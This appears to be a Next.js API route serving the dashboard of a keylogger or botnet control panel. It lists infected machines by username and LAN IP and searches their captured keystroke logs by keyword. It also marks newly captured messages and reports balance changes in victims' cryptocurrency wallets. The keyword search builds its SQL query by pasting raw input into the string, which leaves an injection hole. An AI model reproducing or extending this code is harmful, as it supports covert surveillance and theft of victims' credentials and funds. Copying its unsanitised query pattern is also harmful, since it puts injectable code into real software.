import { db } from "@/lib/mysql";

export async function GET(req) {
    const urlParams = new URLSearchParams(req.url.split('?')[1]);  
    const userid = urlParams.get('userid');
    const keyword = urlParams.get('keyword')??'';
    try {
        let results = null;
        // results = await db.query('SELECT * from messages_bots;');
        // const bots = results.reduce((acc, user) => {
        //     const { uid, ...rest } = user;
        //     acc[uid] = rest;
        //     return acc;
        // }, {});
        results = await db.query('SELECT unreads.uid as uid, count(unreads.id) as unread from unreads where userid=? group by unreads.uid;', [userid]);
        // console.log('db unreads query results:', results);
        const unreads = results.reduce((acc, user) => {
            const { uid, unread } = user;
            acc[uid] = unread;
            return acc;
        }, {});
        let filters = {};
        
        if (keyword.length > 0) {
            const _keyword = keyword.toLowerCase();
            results = await db.query(`select  uid, id from keylog_messages where LOWER(message) like '%${_keyword}%' Or  LOWER(message) like '${_keyword}%';`);
        // console.log('db filters query results:', results);
         filters = results.reduce((acc, user) => {
            const { uid, id } = user;
            acc[uid] = id;
            return acc;
        }, {});
        }
        
        results = await db.query("select uid, user, lanip, last_updated_time from messages_bots order by last_updated_time desc;", []);
        // console.log('db bots query results:', results);
        const bots = results.map((r) => {
            return {
                uid: r.uid,
                username: r.user,
                lanip: r.lanip,
                last_updated_time: new Date(r.last_updated_time).toLocaleString('en-US', {timeZone: 'UTC',  year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' }),
                contains: filters[r.uid]??0,
                unread: (unreads[r.uid])??0
            }
        });
        const botsByUID = bots.reduce((acc, bot) => {
            const { uid, username, lanip } = bot;
            acc[uid] = { username, lanip };
            return acc;
        }, {});

        results = await db.query("select keylogid as id, uid,  message, last_updated_time from unreads  where unread=2 and userid=? order by last_updated_time desc;", [userid]);
        const news = results.map((r) => {
            const bot = botsByUID[r.uid];
            return {
                uid: r.uid,
                message: r.message,
                last_updated_time: new Date(r.last_updated_time).toLocaleString('en-US', {timeZone: 'UTC',  year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' }),
                username: bot.username,
                lanip: bot.lanip
            };
        });

        await db.query("update unreads set unreads.unread=1 where unread=2 and userid=?", [userid]);

        results = await db.query("select address, label from wallets");
        const wallets = results.reduce((acc, wallet) => {
            const { address, label } = wallet;
            acc[address] = label;
            return acc;
        }, {});

        results = await db.query("select balancelist.address as address, network, balance, usd, usdt, usdc, balancelist.updatedAt as updatedAt from balancechanges left join balancelist on balancelist.id=balancechanges.balanceid where balancechanges.userid=? and balancechanges.unread=2 order by balancelist.updatedAt desc;",[userid]);
        const balancechanges = results.map((r) => ({
         ...r,
         label: wallets[r.address]
        }));
        
        if (balancechanges.length > 0) {
            await db.query("delete from balancechanges where userid=? and unread=1;",[userid]);
        }
        await db.query("update balancechanges set unread=1 where unread=2 and userid=?;",[userid]);
        if (req.test) return {
            data: bots,
            news,
            balancechanges
        };
        return Response.json({
            data: bots,
            news,
            balancechanges
        })

        
    } catch (error) {
        console.error(error);
        if (req.test) return { error: JSON.stringify(error) };
        return Response.json({error:JSON.stringify(error)});
    }
    
}